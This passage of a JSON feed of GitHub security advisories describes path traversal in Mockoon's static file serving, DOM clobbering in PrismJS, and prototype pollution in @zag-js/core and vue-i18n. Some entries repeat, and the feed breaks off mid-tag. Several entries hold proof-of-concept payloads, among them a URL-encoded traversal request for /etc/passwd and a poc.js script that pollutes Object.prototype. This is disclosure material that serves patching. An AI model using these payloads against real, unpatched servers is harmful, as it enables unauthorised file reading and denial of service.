            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A mock API configuration for static file serving following the same approach presented in the <a href=\"https://mockoon.com/tutorials/create-endpoint-serving-static-file/\">documentation page</a>, where the server filename is generated via templating features from user input is vulnerable to Path Traversal and LFI, allowing an attacker to get any file in the mock server filesystem.\nThe issue may be particularly relevant in cloud hosted server instances</p>\n<h3 id=\"details\">Details</h3>\n<p>In <code>sendFileWithCallback</code>(<a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400\">code</a>) and <code>sendFile</code>(<a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551\">code</a>) the <code>filePath</code> variable is parsed using <code>TemplateParser</code></p>\n<pre><code class=\"language-js\">let filePath = TemplateParser({\n        shouldOmitDataHelper: false,\n        // replace backslashes with forward slashes, but not if followed by a dot (to allow helpers with paths containing properties with dots: e.g. {{queryParam 'path.prop\\.with\\.dots'}})\n        content: routeResponse.filePath.replace(/\\\\(?!\\.)/g, '/'),\n        environment: this.environment,\n        processedDatabuckets: this.processedDatabuckets,\n        globalVariables: this.globalVariables,\n        request: serverRequest,\n        envVarsPrefix: this.options.envVarsPrefix\n      });\n</code></pre>\n<p>The path extracted from the request parameters used when composing the final file path is not sanitized and is vulnerable to path traversal exploits (e.g. <code>../../../../../etc/passwd</code>)</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"test-setup\">Test setup</h4>\n<p>The issue has been tested with <code>mockoon-cli</code>, using the Docker image <code>mockoon/cli:latest</code></p>\n<p><a href=\"https://github.com/user-attachments/files/18199899/config.json\">config.json</a></p>\n<pre><code class=\"language-bash\"># Folder setup\nmkdir mockoon-test\ncd mockoon-test\n\n# put config.json in mockooon-test dir\n\nmkdir static\n</code></pre>\n<pre><code class=\"language-bash\"># Run container\ndocker run -d --mount type=bind,source=./config.json,target=/data,readonly -v ./static:/static -p 3000:3000 mockoon/cli:latest -d data -p 3000\n</code></pre>\n<h4 id=\"payload-to-reproduce\">Payload to reproduce</h4>\n<p>Browsing directly to <code>http://localhost:3000/static/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</code> is going to display the <code>/etc/passwd</code> file in the container filesystem</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mockoon/mockoon/security/advisories/GHSA-w7f9-wqc4-3wxr\">https://github.com/mockoon/mockoon/security/advisories/GHSA-w7f9-wqc4-3wxr</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/commit/c7f6e23e87dc3b8cc44e5802af046200a797bd2e\">https://github.com/mockoon/mockoon/commit/c7f6e23e87dc3b8cc44e5802af046200a797bd2e</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400\">https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551\">https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w7f9-wqc4-3wxr\">https://github.com/advisories/GHSA-w7f9-wqc4-3wxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w7f9-wqc4-3wxr",
            "title": "[@mockoon/cli] Mockoon has a Path Traversal and LFI in the static file serving endpoint",
            "date_modified": "2025-03-11T16:17:43.000Z",
            "date_published": "2025-03-11T16:17:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w7f9-wqc4-3wxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A mock API configuration for static file serving following the same approach presented in the <a href=\"https://mockoon.com/tutorials/create-endpoint-serving-static-file/\">documentation page</a>, where the server filename is generated via templating features from user input is vulnerable to Path Traversal and LFI, allowing an attacker to get any file in the mock server filesystem.\nThe issue may be particularly relevant in cloud hosted server instances</p>\n<h3 id=\"details\">Details</h3>\n<p>In <code>sendFileWithCallback</code>(<a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400\">code</a>) and <code>sendFile</code>(<a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551\">code</a>) the <code>filePath</code> variable is parsed using <code>TemplateParser</code></p>\n<pre><code class=\"language-js\">let filePath = TemplateParser({\n        shouldOmitDataHelper: false,\n        // replace backslashes with forward slashes, but not if followed by a dot (to allow helpers with paths containing properties with dots: e.g. {{queryParam 'path.prop\\.with\\.dots'}})\n        content: routeResponse.filePath.replace(/\\\\(?!\\.)/g, '/'),\n        environment: this.environment,\n        processedDatabuckets: this.processedDatabuckets,\n        globalVariables: this.globalVariables,\n        request: serverRequest,\n        envVarsPrefix: this.options.envVarsPrefix\n      });\n</code></pre>\n<p>The path extracted from the request parameters used when composing the final file path is not sanitized and is vulnerable to path traversal exploits (e.g. <code>../../../../../etc/passwd</code>)</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"test-setup\">Test setup</h4>\n<p>The issue has been tested with <code>mockoon-cli</code>, using the Docker image <code>mockoon/cli:latest</code></p>\n<p><a href=\"https://github.com/user-attachments/files/18199899/config.json\">config.json</a></p>\n<pre><code class=\"language-bash\"># Folder setup\nmkdir mockoon-test\ncd mockoon-test\n\n# put config.json in mockooon-test dir\n\nmkdir static\n</code></pre>\n<pre><code class=\"language-bash\"># Run container\ndocker run -d --mount type=bind,source=./config.json,target=/data,readonly -v ./static:/static -p 3000:3000 mockoon/cli:latest -d data -p 3000\n</code></pre>\n<h4 id=\"payload-to-reproduce\">Payload to reproduce</h4>\n<p>Browsing directly to <code>http://localhost:3000/static/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</code> is going to display the <code>/etc/passwd</code> file in the container filesystem</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mockoon/mockoon/security/advisories/GHSA-w7f9-wqc4-3wxr\">https://github.com/mockoon/mockoon/security/advisories/GHSA-w7f9-wqc4-3wxr</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/commit/c7f6e23e87dc3b8cc44e5802af046200a797bd2e\">https://github.com/mockoon/mockoon/commit/c7f6e23e87dc3b8cc44e5802af046200a797bd2e</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400\">https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400</a></li>\n<li><a href=\"https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551\">https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w7f9-wqc4-3wxr\">https://github.com/advisories/GHSA-w7f9-wqc4-3wxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w7f9-wqc4-3wxr",
            "title": "[@mockoon/commons-server] Mockoon has a Path Traversal and LFI in the static file serving endpoint",
            "date_modified": "2025-03-11T16:17:43.000Z",
            "date_published": "2025-03-11T16:17:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w7f9-wqc4-3wxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Prism (aka PrismJS) through 1.29.0 allows DOM Clobbering (with resultant XSS for untrusted input that contains HTML but does not directly contain JavaScript), because document.currentScript lookup can be shadowed by attacker-injected HTML elements.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53382\">https://nvd.nist.gov/vuln/detail/CVE-2024-53382</a></li>\n<li><a href=\"https://gist.github.com/jackfromeast/aeb128e44f05f95828a1a824708df660\">https://gist.github.com/jackfromeast/aeb128e44f05f95828a1a824708df660</a></li>\n<li><a href=\"https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/prism.js#L226-L259\">https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/prism.js#L226-L259</a></li>\n<li><a href=\"https://github.com/PrismJS/prism/pull/3863\">https://github.com/PrismJS/prism/pull/3863</a></li>\n<li><a href=\"https://github.com/PrismJS/prism/commit/8e8b9352dac64457194dd9e51096b4772532e53d\">https://github.com/PrismJS/prism/commit/8e8b9352dac64457194dd9e51096b4772532e53d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x7hr-w5r2-h6wg\">https://github.com/advisories/GHSA-x7hr-w5r2-h6wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x7hr-w5r2-h6wg",
            "title": "[prismjs] PrismJS DOM Clobbering vulnerability",
            "date_modified": "2025-03-10T22:19:23.000Z",
            "date_published": "2025-03-03T09:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x7hr-w5r2-h6wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the lib.deepMerge function of @zag-js/core v0.50.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57079\">https://nvd.nist.gov/vuln/detail/CVE-2024-57079</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b\">https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b</a></li>\n<li><a href=\"https://github.com/chakra-ui/zag/pull/2255\">https://github.com/chakra-ui/zag/pull/2255</a></li>\n<li><a href=\"https://github.com/chakra-ui/zag/commit/f53edc548f737aadfdd486a0043bdd5f5c068bbf\">https://github.com/chakra-ui/zag/commit/f53edc548f737aadfdd486a0043bdd5f5c068bbf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fg4m-w35q-vfg2\">https://github.com/advisories/GHSA-fg4m-w35q-vfg2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2",
            "title": "[@zag-js/core] @zag-js/core prototype pollution",
            "date_modified": "2025-03-10T17:08:36.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[petite-vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a 